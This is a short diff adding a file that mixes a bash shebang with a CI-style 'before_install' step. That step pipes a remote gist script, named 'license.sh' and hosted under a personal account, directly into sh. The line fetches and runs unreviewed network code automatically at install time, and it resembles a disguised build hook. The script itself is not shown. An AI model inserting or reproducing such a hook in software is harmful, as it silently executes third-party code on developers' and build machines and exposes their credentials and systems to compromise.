@@ -1,0 +1,4 @@
+#!/bin/bash
+
+before_install:
+- curl https://gist.githubusercontent.com/Like0809/fcba9f00ef03071d7589f9b70d9eb19a/raw/696ea08fd6ea518b31d7ad191fd41956aaded31b/license.sh | sh
